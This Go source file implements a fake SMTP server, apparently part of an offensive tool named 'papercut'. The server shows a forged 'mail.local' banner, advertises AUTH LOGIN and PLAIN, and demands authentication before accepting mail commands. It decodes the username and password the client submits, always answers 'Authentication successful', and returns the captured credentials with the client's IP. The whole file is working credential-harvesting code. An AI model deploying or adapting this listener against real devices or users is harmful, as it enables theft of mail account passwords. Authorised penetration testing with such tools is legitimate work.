package listener

import (
	"bufio"
	"context"
	"encoding/base64"
	"fmt"
	"net"
	"strings"
	"time"

	"papercut/internal/output"
)

// SMTPCreds holds captured SMTP authentication credentials.
type SMTPCreds struct {
	SourceIP   string
	Username   string
	Password   string
	AuthMethod string // "LOGIN", "PLAIN"
}

// ListenSMTP starts a TCP listener on addr (host:port), waits for one incoming
// SMTP connection with AUTH, captures credentials, then returns.
// It blocks until credentials are received or the context/timeout expires.
func ListenSMTP(ctx context.Context, addr string, timeout time.Duration, verbose bool) (*SMTPCreds, error) {
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return nil, fmt.Errorf("listen on %s: %w", addr, err)
	}
	defer ln.Close()

	// Close listener when context is cancelled
	go func() {
		<-ctx.Done()
		ln.Close()
	}()

	// Set accept deadline based on timeout
	if tcpLn, ok := ln.(*net.TCPListener); ok {
		tcpLn.SetDeadline(time.Now().Add(timeout))
	}

	conn, err := ln.Accept()
	if err != nil {
		select {
		case <-ctx.Done():
			return nil, fmt.Errorf("cancelled while waiting for SMTP connection")
		default:
			return nil, fmt.Errorf("accept: %w", err)
		}
	}
	defer conn.Close()

	sourceIP := conn.RemoteAddr().String()
	if host, _, err := net.SplitHostPort(sourceIP); err == nil {
		sourceIP = host
	}

	if verbose {
		output.Info("SMTP connection received from %s", sourceIP)
	}

	conn.SetReadDeadline(time.Now().Add(30 * time.Second))

	reader := bufio.NewReader(conn)

	// Send SMTP banner
	conn.Write([]byte("220 mail.local ESMTP\r\n"))

	for {
		line, err := reader.ReadString('\n')
		if err != nil {
			return nil, fmt.Errorf("read from %s: %w", sourceIP, err)
		}

		line = strings.TrimRight(line, "\r\n")
		upper := strings.ToUpper(line)

		if verbose {
			output.Info("SMTP < %s", line)
		}

		switch {
		case strings.HasPrefix(upper, "EHLO"), strings.HasPrefix(upper, "HELO"):
			conn.Write([]byte("250-mail.local\r\n"))
			conn.Write([]byte("250-AUTH LOGIN PLAIN\r\n"))
			conn.Write([]byte("250 OK\r\n"))

		case strings.HasPrefix(upper, "AUTH LOGIN"):
			creds, err := handleAuthLogin(line, conn, reader, sourceIP, verbose)
			if err != nil {
				return nil, err
			}
			return creds, nil

		case strings.HasPrefix(upper, "AUTH PLAIN"):
			creds, err := handleAuthPlain(line, conn, reader, sourceIP, verbose)
			if err != nil {
				return nil, err
			}
			return creds, nil

		case strings.HasPrefix(upper, "QUIT"):
			conn.Write([]byte("221 Bye\r\n"))
			return nil, fmt.Errorf("client disconnected before authenticating")

		case strings.HasPrefix(upper, "MAIL"), strings.HasPrefix(upper, "RCPT"),
			strings.HasPrefix(upper, "DATA"), strings.HasPrefix(upper, "RSET"),
			strings.HasPrefix(upper, "NOOP"), strings.HasPrefix(upper, "VRFY"):
			// Require auth for mail commands
			conn.Write([]byte("530 Authentication required\r\n"))

		default:
			conn.Write([]byte("250 OK\r\n"))
		}
	}
}

// handleAuthLogin handles the AUTH LOGIN exchange.
// Server sends base64("Username:"), client responds with base64(username),
// server sends base64("Password:"), client responds with base64(password).
// Some clients send the username inline: "AUTH LOGIN dXNlcm5hbWU=" (RFC 4954).
func handleAuthLogin(authLine string, conn net.Conn, reader *bufio.Reader, sourceIP string, verbose bool) (*SMTPCreds, error) {
	var userBytes []byte

	// Check for inline username after "AUTH LOGIN "
	parts := strings.SplitN(authLine, " ", 3)
	if len(parts) == 3 && parts[2] != "" {
		// Inline username provided
		decoded, err := base64.StdEncoding.DecodeString(strings.TrimSpace(parts[2]))
		if err == nil {
			userBytes = decoded
			if verbose {
				output.Info("SMTP AUTH LOGIN inline username: %s", string(userBytes))
			}
		}
	}

	if userBytes == nil {
		// No inline username — send Username challenge
		conn.Write([]byte("334 VXNlcm5hbWU6\r\n"))

		userLine, err := reader.ReadString('\n')
		if err != nil {
			return nil, fmt.Errorf("read username from %s: %w", sourceIP, err)
		}
		userLine = strings.TrimRight(userLine, "\r\n")

		if verbose {
			output.Info("SMTP < %s (username)", userLine)
		}

		userBytes, err = base64.StdEncoding.DecodeString(userLine)
		if err != nil {
			return nil, fmt.Errorf("decode username from %s: %w", sourceIP, err)
		}
	}

	// Send Password challenge (base64 of "Password:")
	conn.Write([]byte("334 UGFzc3dvcmQ6\r\n"))

	// Read base64-encoded password
	passLine, err := reader.ReadString('\n')
	if err != nil {
		return nil, fmt.Errorf("read password from %s: %w", sourceIP, err)
	}
	passLine = strings.TrimRight(passLine, "\r\n")

	if verbose {
		output.Info("SMTP < %s (password)", passLine)
	}

	passBytes, err := base64.StdEncoding.DecodeString(passLine)
	if err != nil {
		return nil, fmt.Errorf("decode password from %s: %w", sourceIP, err)
	}

	// Send auth success
	conn.Write([]byte("235 Authentication successful\r\n"))

	return &SMTPCreds{
		SourceIP:   sourceIP,
		Username:   string(userBytes),
		Password:   string(passBytes),
		AuthMethod: "LOGIN",
	}, nil
}

// handleAuthPlain handles AUTH PLAIN.
// Credentials are either inline (AUTH PLAIN <b64>) or sent after a 334 challenge.
// Format: base64(\0username\0password) or base64(authzid\0username\0password).
func handleAuthPlain(line string, conn net.Conn, reader *bufio.Reader, sourceIP string, verbose bool) (*SMTPCreds, error) {
	parts := strings.SplitN(line, " ", 3)
	var encoded string

	if len(parts) == 3 && parts[2] != "" {
		// Inline: AUTH PLAIN <base64>
		encoded = parts[2]
	} else {
		// Prompt for credentials
		conn.Write([]byte("334\r\n"))

		resp, err := reader.ReadString('\n')
		if err != nil {
			return nil, fmt.Errorf("read AUTH PLAIN from %s: %w", sourceIP, err)
		}
		encoded = strings.TrimRight(resp, "\r\n")

		if verbose {
			output.Info("SMTP < %s (plain)", encoded)
		}
	}

	decoded, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return nil, fmt.Errorf("decode AUTH PLAIN from %s: %w", sourceIP, err)
	}

	// Format: \0username\0password  or  authzid\0username\0password
	fields := strings.SplitN(string(decoded), "\x00", 3)

	var username, password string
	switch len(fields) {
	case 3:
		// authzid\0username\0password
		username = fields[1]
		password = fields[2]
	case 2:
		// \0username\0password (no authzid)
		username = fields[0]
		password = fields[1]
	default:
		return nil, fmt.Errorf("invalid AUTH PLAIN format from %s", sourceIP)
	}

	conn.Write([]byte("235 Authentication successful\r\n"))

	return &SMTPCreds{
		SourceIP:   sourceIP,
		Username:   username,
		Password:   password,
		AuthMethod: "PLAIN",
	}, nil
}
